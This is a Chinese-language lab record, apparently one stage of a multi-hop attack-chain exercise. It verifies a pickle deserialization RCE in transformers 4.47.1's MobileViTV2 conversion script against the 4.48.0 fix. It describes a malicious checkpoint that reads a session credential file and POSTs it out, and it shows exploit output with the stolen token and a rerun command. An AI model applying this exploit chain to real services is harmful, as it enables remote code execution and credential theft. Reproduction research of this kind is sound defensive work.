# Hop 4 — transformers 4.47.1 反序列化 RCE (CVE-2024-11392)

日期:2026-11-20。状态:**G1 双版本验证 PASS**(4.47.1 exit 0 / 4.48.0 exit 2)。

本跳复用已完整验证的独立积木 [realworld/CVE-2024-11392](../../CVE-2024-11392/README.md),按链场景适配(服务 C = 内网"模型转换服务",loot = C 持有的 keras 预处理服务会话凭据)。

## 真实漏洞代码(官方 wheel,积木阶段已逐行核实)

`transformers/models/mobilevitv2/convert_mlcvnets_to_pytorch.py`(4.47.1 官方 wheel):

```python
def convert_mobilevitv2_checkpoint(*args, **kwargs):
    ...
    checkpoint_state_dict = torch.load(checkpoint_path, map_location="cpu")  # ← 无 weights_only,直接反序列化用户文件
```

修复(4.48.0):**conversion 脚本整体从 release wheel 移除**——同一请求收到 HTTP 410 "conversion scripts are not shipped in this library build"。torch 依赖钉在 `>=2.0,<2.6`(2.6 起 torch.load 默认 weights_only=True 会掩盖漏洞路径,积木阶段已踩过此坑并在报告记录)。

## 场景声明(PLAN.md §3)

"模型转换服务 C 暴露 conversion endpoint、C 上存有对 keras 预处理服务的会话凭据"为**合成部署场景**。漏洞原语(用户上传 checkpoint 被官方 conversion 脚本 torch.load)100% 来自官方 wheel。

## G1 双版本验证

| 版本 | wheel | 结果 |
|---|---|---|
| 4.47.1(受影响) | 官方 PyPI wheel | exploit SUCCESS(exit 0):zip 内恶意 .pt 经 `convert_mobilevitv2_checkpoint` 的 `torch.load` 反序列化 → `__reduce__` exec → 读 `/etc/run-secrets/keras_session` 并 POST 外泄 |
| 4.48.0(修复) | 官方 PyPI wheel | 同一 exploit FAIL(exit 2):HTTP 410,conversion 模块不存在,监听器零回连 |

### 4.47.1 运行输出(2026-11-20)

```
[exploit] victim HTTP 500: {"detail":"Traceback ... _run_conversion ..."}   ← conversion 脚本内部报错 = torch.load 已执行
[exploit] loot received (56 bytes): b'keras-preprocess-login:725b3b93489442d9a37f4ca9e8cf13d5\n'...
exit=0
```

注:500 是 conversion 脚本在 RCE 之后的正常崩溃(payload 不是合法 state_dict);loot 在崩溃前已外泄——与 hop2 的"isinstance 校验在 RCE 后"同型:handler 报错不构成防御。

### 4.48.0 运行输出

```
[exploit] victim HTTP 410: {"detail":"conversion scripts are not shipped in this library build","library_version":"4.48.0","status":"unsupported"}
[exploit] FAIL: loot never arrived — no RCE
exit=2
```

## 运行记录

- 项目:`docker compose -p hop4-vuln`(host 17883)/ `-p hop4-fix`(17884)
- exploit:`attacker/reference_exploit.py`,退出码 0=RCE+loot、2=不可达/被修(修复版预期)、3=loot 为空
- loot:经 Dockerfile 固化(build 时随机 UUID),文件 `/etc/run-secrets/keras_session`,内容 `keras-preprocess-login:<uuid>`
- 复跑:`docker exec hop4_attacker_vuln python /app/reference_exploit.py http://convert-c:8080 9999`
